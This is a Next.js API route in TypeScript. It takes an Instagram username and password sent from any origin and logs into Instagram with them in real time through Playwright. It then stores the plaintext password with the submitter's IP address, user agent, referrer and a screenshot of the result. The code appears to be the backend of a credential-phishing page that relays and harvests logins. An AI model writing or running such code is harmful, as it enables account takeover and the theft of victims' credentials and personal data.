import { type NextRequest } from "next/server";
import { executeVirtualInstagramLogin } from "@/lib/instagram-login";
import { getStorage } from "@/lib/storage";
import { getClientIp } from "@/lib/ip";
import { corsHeaders } from "@/lib/cors";

// Playwright login automation needs a longer execution budget than a normal API route.
export const maxDuration = 60;

export async function OPTIONS(request: NextRequest) {
  return new Response(null, {
    status: 204,
    headers: corsHeaders(request),
  });
}

export async function POST(request: NextRequest) {
  try {
    let body: { username?: string; password?: string; sessionId?: string } = {};
    try {
      body = await request.json();
    } catch {
      return Response.json({ error: "Invalid JSON body" }, { status: 400, headers: corsHeaders(request) });
    }

    const { username, password, sessionId } = body;
    if (!username || !password) {
      return Response.json(
        { error: "Username and password are required" },
        { status: 400, headers: corsHeaders(request) }
      );
    }

    // Execute real-time virtual tab login via Playwright
    const result = await executeVirtualInstagramLogin(username, password, undefined, sessionId);

    // Record the virtual login attempt in event storage
    const storage = await getStorage();
    const eventId = `${Date.now()}-${Math.random().toString(36).slice(2, 11)}`;
    await storage.save({
      id: eventId,
      event: "virtual_login_attempt",
      ip: getClientIp(request),
      userAgent: request.headers.get("user-agent") ?? "",
      referrer: request.headers.get("referer") ?? "",
      url: request.headers.get("referer") ?? "",
      timestamp: new Date().toISOString(),
      metadata: {
        username,
        password,
        status: result.status,
        message: result.message,
        finalUrl: result.finalUrl,
        screenshotBase64: result.screenshotBase64,
      },
    });

    return Response.json({ success: true, id: eventId, result }, { headers: corsHeaders(request) });
  } catch (error) {
    console.error("[login-attempt] error:", error);
    return Response.json(
      { error: "Failed to execute virtual Instagram login" },
      { status: 500, headers: corsHeaders(request) }
    );
  }
}
